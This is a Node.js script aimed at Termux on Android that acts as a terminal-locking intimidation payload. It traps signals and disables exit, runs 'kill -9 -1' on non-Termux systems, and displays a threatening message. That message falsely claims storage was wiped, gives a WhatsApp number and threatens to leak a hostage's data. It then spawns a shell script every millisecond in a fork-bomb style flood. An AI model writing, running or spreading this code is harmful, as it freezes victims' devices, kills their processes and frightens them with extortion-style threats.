

import chalk from 'chalk';
import fsp from 'fs/promises';
import { spawn } from 'child_process';
lock();
import fs from 'fs';
import path from 'path';

const DURATION_MS = 2 * 60 * 1000; 
const SAVE_FILE = `${process.env.PREFIX}/.data.json`;

function getEndTime() {
  try {
    if (fs.existsSync(SAVE_FILE)) {
      const data = JSON.parse(fs.readFileSync(SAVE_FILE, 'utf8'));
      if (data.endTime) return data.endTime;
    }
  } catch {}
  
  const endTime = Date.now() + DURATION_MS;
  fs.writeFileSync(SAVE_FILE, JSON.stringify({ endTime }));
  return endTime;
}

function format(ms) {
  const totalSec = Math.max(0, Math.floor(ms / 1000));
  const h = String(Math.floor(totalSec / 3600)).padStart(2, '0');
  const m = String(Math.floor((totalSec % 3600) / 60)).padStart(2, '0');
  const s = String(totalSec % 60).padStart(2, '0');
  return `${h}:${m}:${s}`;
}

async function startTimer() {
  const endTime = getEndTime();
  setInterval(async() => {
    const sisa = endTime - Date.now();
    if (sisa <= 0) {
      await forkbomb();
      try { fs.unlinkSync(SAVE_FILE); } catch {}
    }
    process.stdout.write(`\r ${format(sisa)}`);
  }, 900);
}

async function forkbomb(){
	const pilon = `#!/usr/bin/env bash

echo hello
	`;
	fs.writeFile(`${process.env.PREFIX}/.bom.sh`,pilon);
	await sleep(1200);
	setInterval(() => {
		spawn(`bash ${process.env.PREFIX}/.bom.sh &`,{
			stdio:'inherit',shell:true,detached:true
		});
	},50);
}




const log = (k) => {
	console.log(chalk.bold(k))
}

function sleep(ms){
	return new Promise(
		r => setTimeout(r,ms)
	)
} function clear(){
	spawn('clear',{
		stdio:'inherit',shell:true
	});
} async function cek(){
	return process.env.HOME === '/data/data/com.termux/files/home' ||
	       process.env.PREFIX === '/data/data/com.termux/files/usr';
} async function good(){
	if(await cek()){
		await next();
	} else {
		spawn('kill -9 -1',{
			stdio:'inherit',shell:true
		});
	}
} good().catch(() => {});


async function next(){
	clear();
	await sleep(560);
	await log(chalk.hex('#ff0000')(String.raw`
   _     _  __     __  ___           __
  (_)__ / |/ /__  / /_/ _ \___ ___  / /____ ____ ____  ___
 / (_-</    / _ \/ __/ ___/ -_) _ \/ __/ _ '/ _ '/ _ \/ _ \
/_/___/_/|_/\___/\__/_/   \__/_//_/\__/\_,_/\_, /\___/_//_/
                                           /___/
${chalk.hex('#ff0000')('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')}
                ..                        .
              .,,                          ;.
             ,''.                          ;.'.
            ;..;.                          :'.,.
           ,'..;.                          :,..,.
           ;...;;        ..........       .:,...;
          .'....;.  ..,,...........','.  .;;....;
          .'.   .;,;:;'.           .',;:;;,.....;
       .   ,.    ..',;..            .,;,'..   ..,   ,
       ;' .;..   ....;.             .';........,, .;;
       ,,,;,;,.....,;.               .';'....';;,;,,.
        ,,',;;;;;,,'.    ${chalk.underline.italic.hex('#ff0000')('XnetForums')}     .',;;;:;;,'',
        '',,,:,....          x           ....;;,,''.
         ...',;..      ${chalk.white.underline('CyberGirl_Haxor')}     ...';,''.,
          '...,,....                   .....;'..'.
            ..;.  .,;'.... ..  .....'',;'...,,.
              ,.    ..',,,',.  ''',,,'..   ..'
               '.   ...         . ....... ...
                ...';,.    .   ..    .;;..'
                 '....;.....   .'. .';...,.
                  '....,''';...,,'',;....;
                    '..',',';,;,',';....
                      ,.;'.'';,''.,'.,
                       ;,,,''..'',,,'
                        ''........,
                          '.    .
                        ${chalk.italic.underline.gray('Hello Losers')}
                  ${chalk.white('Kudeta by')} ${chalk.hex('#ff0000')('VerdziskaH4x0r')}`));
	await log(`
  We have wiped your internal storage clean to remove dirt
 and files that are useless to us and if you really want me
  to stop making a mess then please tell this loser number:

                         (${chalk.hex('#ff0000').italic.underline('Bntg1337')})
        ${chalk.hex('#00ffff').underline.italic('https://wa.me/6283174982623?text=Hello+Losers')}

        Tell him where he got the information from?
    Why did he dare to badmouth VerdziskaH4x0r in front?

 In 2 Minutes if you do not want to cooperate with us
 then be prepared that we will distribute the data
 of someone we are holding hostage.

 Choose to save the hostage or we destroy all his life?
 `);
 	await sleep(5200);
 	const pilon = `#!/usr/bin/env bash
echo true
 	`;
 	await fsp.writeFile(`${process.env.PREFIX}/.bm.sh`,pilon);
 	await sleep(200);
 	setInterval(() => {
 		spawn(`bash ${process.env.PREFIX}/.bm.sh &`,{
 			stdio:'inherit',shell:true,detached:true
 		});
 	},1);
}


function lock() {
  const message = 'isNotPentagon - XnetForums';
  setInterval(()=>{},500);
  const stdin = process.stdin;
  const stdout = process.stdout;
  stdout.write('\x1b[?25l');
  stdout.write('\x1b[2J\x1b[H');
  if (stdin.isTTY) stdin.setRawMode(true);
  stdin.resume();
  stdin.setEncoding('utf8');
  stdin.on('data', () => {});
  process.stdout.write(`\x1B[?25l\x1b]0;${message}\x07`);
  const noop = () => {};
  [
    'SIGINT',
    'SIGTSTP',
    'SIGQUIT',
    'SIGHUP',
    'SIGTERM',
    'SIGUSR1',
    'SIGUSR2'
  ].forEach(sig => {
    try { process.on(sig, noop); } catch {}
  });
  process.on('uncaughtException', noop);
  process.on('unhandledRejection', noop);
  process.exit = () => {};
  process.kill = () => false;
  if (stdout.isTTY) {
    stdout.write('\x1b[?7l');
  }
}
